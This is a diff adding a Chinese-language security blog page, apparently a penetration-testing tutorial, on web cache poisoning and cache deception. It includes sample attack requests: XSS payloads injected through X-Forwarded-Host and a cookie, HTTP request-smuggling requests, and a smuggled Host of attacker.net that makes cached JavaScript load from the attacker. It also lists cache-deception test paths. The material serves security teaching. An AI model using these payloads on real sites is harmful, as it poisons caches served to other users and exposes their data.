@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x01 区别缓存中毒 攻击者通过缓存中毒攻击，在应用程序中的 web 缓存中存储恶意内容，恶意内容将提供给其他应用程序用户。缓存欺骗 攻击者通过缓存欺骗攻击，将其他用户的敏感信息储存到缓存中，然后攻击者通过检索缓存内容获取其他用户的信息。  0x02 缓存中毒缓存中毒的目的是使客户端加载由攻击者控制的资源。执行缓存中毒攻击的前提是识别非缓存键（unkeyed inputs）。  缓存键（keye">
+<meta property="og:type" content="article">
+<meta property="og:title" content="缓存中毒及缓存欺骗攻击">
+<meta property="og:url" content="http://example.com/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="sing&#39;s Blog">
+<meta property="og:description" content="0x01 区别缓存中毒 攻击者通过缓存中毒攻击，在应用程序中的 web 缓存中存储恶意内容，恶意内容将提供给其他应用程序用户。缓存欺骗 攻击者通过缓存欺骗攻击，将其他用户的敏感信息储存到缓存中，然后攻击者通过检索缓存内容获取其他用户的信息。  0x02 缓存中毒缓存中毒的目的是使客户端加载由攻击者控制的资源。执行缓存中毒攻击的前提是识别非缓存键（unkeyed inputs）。  缓存键（keye">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-11-21T15:29:08.000Z">
+<meta property="article:modified_time" content="2022-11-21T15:30:33.824Z">
+<meta property="article:author" content="sing">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="缓存中毒">
+<meta property="article:tag" content="缓存欺骗">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>缓存中毒及缓存欺骗攻击 | sing's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">sing's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sing's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          缓存中毒及缓存欺骗攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-11-21 23:29:08 / Modified: 23:30:33" itemprop="dateCreated datePublished" datetime="2022-11-21T23:29:08+08:00">2022-11-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/" itemprop="url" rel="index"><span itemprop="name">缓存中毒及缓存欺骗攻击</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x01-区别"><a href="#0x01-区别" class="headerlink" title="0x01 区别"></a>0x01 区别</h1><h2 id="缓存中毒"><a href="#缓存中毒" class="headerlink" title="缓存中毒"></a>缓存中毒</h2><ul>
+<li>攻击者通过缓存中毒攻击，在应用程序中的 web 缓存中存储恶意内容，恶意内容将提供给其他应用程序用户。<h2 id="缓存欺骗"><a href="#缓存欺骗" class="headerlink" title="缓存欺骗"></a>缓存欺骗</h2></li>
+<li>攻击者通过缓存欺骗攻击，将其他用户的敏感信息储存到缓存中，然后攻击者通过检索缓存内容获取其他用户的信息。</li>
+</ul>
+<h1 id="0x02-缓存中毒"><a href="#0x02-缓存中毒" class="headerlink" title="0x02 缓存中毒"></a>0x02 缓存中毒</h1><p>缓存中毒的目的是使客户端加载由攻击者控制的资源。执行缓存中毒攻击的前提是识别<code>非缓存键</code>（unkeyed inputs）。</p>
+<ul>
+<li>缓存键（keyed inputs）：指的是作为缓存服务器识别某个请求特征的请求信息，如特征匹配，则从缓存服务器返回已缓存的响应信息，通常为：<code>request-line</code> 和 <code>user-agent</code>。</li>
+<li>非缓存键（unkeyed inputs）：指的是不作为缓存服务器匹配特征的其他请求信息，如 <code>Cookie: language=pl</code>;</li>
+</ul>
+<p>所谓识别<code>非缓存键</code>，其实是指识别不作为缓存特征却能影响响应结果的请求信息。可能是参数，可能是请求头。</p>
+<h2 id="识别-web应用程序是否使用了缓存技术"><a href="#识别-web应用程序是否使用了缓存技术" class="headerlink" title="识别 web应用程序是否使用了缓存技术"></a>识别 web应用程序是否使用了缓存技术</h2><h3 id="1-检查-HTTP-标头"><a href="#1-检查-HTTP-标头" class="headerlink" title="1. 检查 HTTP 标头"></a>1. 检查 HTTP 标头</h3><p>通常，当响应信息来自缓存时，响应包会存在明确响应标头。</p>
+<p><strong>服务器缓存标头</strong></p>
+<ul>
+<li><code>X-Cache</code>：有两个值 miss 和 hit ,分别表示命中缓存失败及命中缓存成功。</li>
+<li><code>Cache-Control</code> ：指示资源是否正在被缓存以及缓存资源下一次被缓存的时间间隔：<code>Cache-Control: public, max-age=1800</code>。</li>
+<li><code>Vary</code>：指示哪些请求信息被视为缓存键，即自定义缓存键。</li>
+<li><code>Age</code> ：指示缓存资源在缓存服务器中的存活时间长度（以秒为单位）</li>
+<li><code>Server-Timing: cdn-cache; desc=HIT</code>：缓存资源命中</li>
+</ul>
+<p><strong>本地缓存标头</strong></p>
+<ul>
+<li><code>Clear-Site-Data</code>: 指示应被删除的缓存信息 <code>Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;</code>。</li>
+<li><code>Expires</code>: 指示缓存过期日期，<code>Expires: Wed, 21 Oct 2015 07:28:00 GMT</code>。</li>
+<li><code>Pragma: no-cache</code> :表示不做缓存。</li>
+<li><code>Warning</code>: <em><strong>未知！！！</strong></em></li>
+</ul>
+<h3 id="2-检查-400-响应码"><a href="#2-检查-400-响应码" class="headerlink" title="2. 检查 400 响应码"></a>2. 检查 400 响应码</h3><p>使用不符合规范的请求标头（例如：<code>\:</code>）对某个资源进行请求，迫使应用程序返回 400 错误响应码。然后正常请求该资源，若仍然返回 400 错误响应码，则证明该 web 站点受到缓存中毒影响。某些缓存服务器可能不对响应状态码进行缓存，此时，该测试无效。</p>
+<h2 id="识别非缓存键"><a href="#识别非缓存键" class="headerlink" title="识别非缓存键"></a>识别非缓存键</h2><p>使用 <a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">Param Miner</a> 暴力破解可能影响响应结果的参数或者请求标头。</p>
+<h2 id="触发恶意响应"><a href="#触发恶意响应" class="headerlink" title="触发恶意响应"></a>触发恶意响应</h2><p>识别非缓存键后，分析该非缓存键如何影响响应结果。触发XSS攻击或者DOS攻击。</p>
+<h2 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h2><h3 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3><p>假设 x-forward-for 反映在响应结果中，通过发送 XSS 攻击 payload 毒化缓存，访问 <code>/en?region=uk</code> 的用户均被 XSS 攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?region=uk</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>innocent-website.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>假设 Cookie 反映在页面上，则可以用通过 Cookie 投毒。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd&quot;%2balert(1)%2b&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="通过多个请求标头进行缓存中毒攻击"><a href="#通过多个请求标头进行缓存中毒攻击" class="headerlink" title="通过多个请求标头进行缓存中毒攻击"></a>通过多个请求标头进行缓存中毒攻击</h3><p>有时候需要多个非缓存键才能进行投毒缓存攻击。例如，如果某个页面存在以下情况：服务器会将所有 <code>http</code> 请求转发到 <code>https</code>，并且将 <code>x-forward-host</code> 作为目的域名。发送一个 http 请求，将 <code>x-forward-scheme</code> 设置为 <code>http</code>，服务器识别到 <code>http</code> ，触发重定向，并使用 <code>x-forward-host</code> 作为重定向的域名。所以可以通过重定向来控制页面的指向资源。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/resources/js/tracking.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acc11fe01f16f89c80556c2b0056002e.web-security-academy.net</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/</span><br><span class="line"><span class="attribute">X-Forwarded-Scheme</span><span class="punctuation">: </span>http</span><br></pre></td></tr></table></figure>
+
+<h3 id="http-请求走私-http-缓存中毒"><a href="#http-请求走私-http-缓存中毒" class="headerlink" title="http 请求走私 + http 缓存中毒"></a>http 请求走私 + http 缓存中毒</h3><p>如果 web 站点存在 http 走私漏洞且存在缓存中毒漏洞，则可以迫使客户端在请求 <code>/static/include.js</code> 的时候，返回 <code>index.html</code> 的内容，这将导致 <code>/static/include.js</code> 无法正常被客户端访问（DOS攻击）。</p>
+<ol>
+<li><p>执行 http 走私攻击</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /index.html HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>受害客户端访问 <code>/static/include.js</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xGET /static/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>后端程序接收到被毒害的请求，资源 <code>/static/include.js</code> 的请求返回了 <code>/index.html</code> 的内容。且该响应资源被缓存服务器存储。至此，受害客户端对于 <code>/static/include.js</code> 的请求会被毒化，返回 <code>/index.html</code> 的内容。</p>
+</li>
+</ol>
+<p>如果 web 站点存在重定向接口，攻击者甚至可以控制客户端加载的 js 文件内容。<br>假设网站有 URI： <code>/post/next?postId=3</code>，访问该 URI 之后，将会被重定向到 <code>/post?postId=4</code>，并且引用 <code>Host</code> 标头作为重定向的目标域。</p>
+<ol>
+<li>攻击者发送 http 走私请求，如下所示：</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: attacker.net</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>受害客户端通过 <code>GET</code> 请求方式访问 <code>/static/include.js</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/post/next?postId=3</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=<span class="number">1</span>GET /static/include.js HTTP/<span class="number">1</span>.<span class="number">1</span>\r\nHost: vulnerable-website.com</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>由于存在重定向漏洞，客户端将会被重定向到 <code>attacker.net/post?postId=4</code>（302重定向包会被返回，并且储存到缓存服务器上），攻击者设置在访问恶意服务器 URL: <code>attacker.net/post?postId=4</code> 时返回恶意 JS 代码。至此，<code>/static/include.js</code> 缓存内容已被毒化成功，访问 <code>/static/include.js</code> 的响应内容均会被替换成攻击者控制的恶意 JS 内容。</p>
+</li>
+</ol>
+<h2 id="Web缓存中毒自动化测试工具"><a href="#Web缓存中毒自动化测试工具" class="headerlink" title="Web缓存中毒自动化测试工具"></a>Web缓存中毒自动化测试工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner">Web缓存中毒漏洞扫描程序</a>，用法示例：<code>wcvs -u example.com</code></p>
+<h1 id="0x03-缓存欺骗"><a href="#0x03-缓存欺骗" class="headerlink" title="0x03 缓存欺骗"></a>0x03 缓存欺骗</h1><p>静态文件(如： <code>.js</code>,<code>.css</code>,<code>.png</code> 等等)通常被配置为保存到缓存服务器中。例如，访问 <code>www.example.com/profile.php/nonexistent.js</code> 的时候，由于某些缓存服务器仅识别访问文件后缀便将响应结果储存在缓存服务器中。但是后端应用程序对于该链接，响应的结果却是：<code>www.example.com/profile.php</code>,其中该响应结果包含用户的一些敏感信息。上述问题将会导致缓存服务器错误地缓存了包含用户敏感信息的响应结果。攻击者可以通过钓鱼，xss，csrf的方式诱使受害者访问 <code>www.example.com/profile.php/nonexistent.js</code> ，从而进行缓存欺骗攻击，窃取用户敏感信息。</p>
+<p>可能有用的测试形式</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/.js">www.example.com/profile.php/.js</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/.css">www.example.com/profile.php/.css</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/test.js">www.example.com/profile.php/test.js</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/test.js">www.example.com/profile.php/../test.js</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/test.js">www.example.com/profile.php/%2e%2e/test.js</a></li>
+<li>Use less known extensions such as .avif</li>
+</ul>
+<blockquote>
+<p>缓存欺骗真实的个案：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/593712">https://hackerone.com/reports/593712</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92/" rel="tag"># 缓存中毒</a>
+              <a href="/tags/%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97/" rel="tag"># 缓存欺骗</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/15/hop-by-hop%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="prev" title="hop-by-hop相关安全知识点">
+      <i class="fa fa-chevron-left"></i> hop-by-hop相关安全知识点
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%8C%BA%E5%88%AB"><span class="nav-number">1.</span> <span class="nav-text">0x01 区别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="nav-number">1.1.</span> <span class="nav-text">缓存中毒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"><span class="nav-number">1.2.</span> <span class="nav-text">缓存欺骗</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="nav-number">2.</span> <span class="nav-text">0x02 缓存中毒</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%86%E5%88%AB-web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8%E4%BA%86%E7%BC%93%E5%AD%98%E6%8A%80%E6%9C%AF"><span class="nav-number">2.1.</span> <span class="nav-text">识别 web应用程序是否使用了缓存技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%A3%80%E6%9F%A5-HTTP-%E6%A0%87%E5%A4%B4"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. 检查 HTTP 标头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%A3%80%E6%9F%A5-400-%E5%93%8D%E5%BA%94%E7%A0%81"><span class="nav-number">2.1.2.</span> <span class="nav-text">2. 检查 400 响应码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%86%E5%88%AB%E9%9D%9E%E7%BC%93%E5%AD%98%E9%94%AE"><span class="nav-number">2.2.</span> <span class="nav-text">识别非缓存键</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E6%81%B6%E6%84%8F%E5%93%8D%E5%BA%94"><span class="nav-number">2.3.</span> <span class="nav-text">触发恶意响应</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.4.</span> <span class="nav-text">利用示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90"><span class="nav-number">2.4.1.</span> <span class="nav-text">简单例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%A4%9A%E4%B8%AA%E8%AF%B7%E6%B1%82%E6%A0%87%E5%A4%B4%E8%BF%9B%E8%A1%8C%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E6%94%BB%E5%87%BB"><span class="nav-number">2.4.2.</span> <span class="nav-text">通过多个请求标头进行缓存中毒攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-http-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="nav-number">2.4.3.</span> <span class="nav-text">http 请求走私 + http 缓存中毒</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7"><span class="nav-number">2.5.</span> <span class="nav-text">Web缓存中毒自动化测试工具</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"><span 